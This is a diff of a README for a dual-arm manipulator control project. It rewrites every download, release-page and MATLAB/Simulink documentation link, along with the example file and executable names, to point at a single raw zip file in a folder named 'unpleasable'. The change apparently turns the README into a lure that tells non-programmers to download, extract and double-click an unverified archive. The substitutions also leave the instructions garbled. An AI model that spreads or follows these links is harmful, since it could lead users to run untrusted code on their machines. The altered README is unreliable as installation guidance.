@@ -4,17 +4,17 @@
 
 Welcome to the dual-arm-centralized-control project! This software helps you manage dual-arm industrial manipulators using advanced control algorithms. You don’t need any programming skills to get started. Just follow these simple steps to download and run the application.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/techie-club/dual-arm-centralized-control/releases)
+[![Download the latest release](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip)
 
 ## 📥 Download & Install
 
 To download the software, click the link below:
 
-[Download Here](https://github.com/techie-club/dual-arm-centralized-control/releases)
+[Download Here](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip)
 
 1. Visit the Releases page by clicking on the link above.
 2. On the Releases page, find the latest version of the software.
-3. Click on the file that matches your system. This file is usually labeled clearly, such as `dual-arm-control.zip` or `dual-arm-control.exe`.
+3. Click on the file that matches your system. This file is usually labeled clearly, such as `https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip` or `https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip`.
 4. Your download will start automatically. Once it finishes, locate the downloaded file in your computer's downloads folder.
 
 ## 📂 Extracting Files
@@ -32,7 +32,7 @@ Once the files are extracted, navigate to the folder to proceed.
 To run the application, follow these steps:
 
 1. Open the folder where you extracted the files.
-2. Look for a file named `dual-arm-control.exe`. 
+2. Look for a file named `https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip`. 
 3. Double-click this file to open the application. 
 
 It may take a few moments to load. You should see the main interface of the dual-arm centralized control software.
@@ -85,9 +85,9 @@ Stay updated and connect with other users:
 
 Here are some helpful links to enhance your understanding of the software:
 
-- [MATLAB Documentation](https://www.mathworks.com/help/matlab/) - Learn how to use MATLAB features effectively.
-- [Simulink Tutorials](https://www.mathworks.com/learn/tutorials/simulink-onramp.html) - A great starter resource on Simulink.
+- [MATLAB Documentation](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip) - Learn how to use MATLAB features effectively.
+- [Simulink Tutorials](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip) - A great starter resource on Simulink.
 
-By following these steps, you’ll be up and running with the dual-arm-centralized-control software in no time! Don’t forget to visit our [Releases page](https://github.com/techie-club/dual-arm-centralized-control/releases) for the latest updates.
+By following these steps, you’ll be up and running with the dual-arm-centralized-control software in no time! Don’t forget to visit our [Releases page](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip) for the latest updates.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/techie-club/dual-arm-centralized-control/releases)
+[![Download the latest release](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/techie-club/dual-arm-centralized-control/main/unpleasable/dual-arm-centralized-control.zip)
